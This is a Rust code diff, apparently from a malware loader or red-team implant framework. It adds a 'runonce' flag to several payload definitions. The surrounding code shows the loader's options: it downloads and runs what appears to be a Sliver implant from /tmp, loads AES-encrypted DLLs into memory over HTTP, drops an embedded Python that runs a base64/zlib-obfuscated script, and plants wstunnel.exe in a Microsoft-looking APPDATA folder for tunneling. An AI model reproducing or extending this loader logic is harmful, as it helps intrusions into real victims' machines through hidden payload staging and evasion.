@@ -109,6 +109,7 @@ fn main() {
                 }),
                 path: "/tmp/sliv_linux".to_string(),
                 hash: "".to_string(),
+                runonce: false,
             }),
             Payload::Exec(Exec {
                 path: "/tmp/sliv_linux".to_string(),
@@ -130,6 +131,7 @@ fn main() {
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
+            runonce:false
         })];
     } else if payload == "dll2".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AES]");
@@ -144,6 +146,7 @@ fn main() {
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
+            runonce:false
         })];
     } else if payload == "2dll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AES]");
@@ -159,6 +162,7 @@ fn main() {
                 }),
                 dll_entrypoint: String::from("DllInstall"),
                 thread: true,
+                runonce:false
             }),
             Payload::DllFromMemory(DllFromMemory {
                 link: Link::HTTP(HTTPLink {
@@ -169,6 +173,7 @@ fn main() {
                 }),
                 dll_entrypoint: String::from("DllInstall"),
                 thread: true,
+                runonce:false
             }),
         ];
     } else if payload == "py".to_string() {
@@ -184,6 +189,7 @@ fn main() {
                     sleep: 0,
                 }),
                 path: "${APPDATA}\\Microsoft\\python\\python-3.10.10-embed-amd64\\".to_string(),
+                runonce: false,
             }),
             Payload::ExecPython(ExecPython {
                 path: "${APPDATA}\\Microsoft\\python\\python-3.10.10-embed-amd64\\".to_string(),
@@ -195,6 +201,7 @@ decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).deco
 exec(decoded_script)
 \0"),
                 thread: false,
+                runonce:false
             }),
         ];
     } else if payload == "file".to_string() {
@@ -210,6 +217,7 @@ exec(decoded_script)
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
+            runonce:false
         })];
     } else if payload == "memdll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AES] from memory slot");
@@ -224,6 +232,8 @@ exec(decoded_script)
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: false,
+            runonce:false
+
         })];
     } else if payload == "wstunnel".to_string() {
         // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
@@ -246,6 +256,7 @@ exec(decoded_script)
             }),
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
             hash:"7fba14e73eab7f6595bc35e99c3fb0d5a04006bc20eee7a3389198bbd896cff42d006c3ecb952a78945da72f7d1d8942bd5314b00abe24fb38c3a9e03862b025".to_string(),
+            runonce: false,
         }),
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
@@ -263,6 +274,7 @@ exec(decoded_script)
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
+            runonce:false
         })
 
         ];
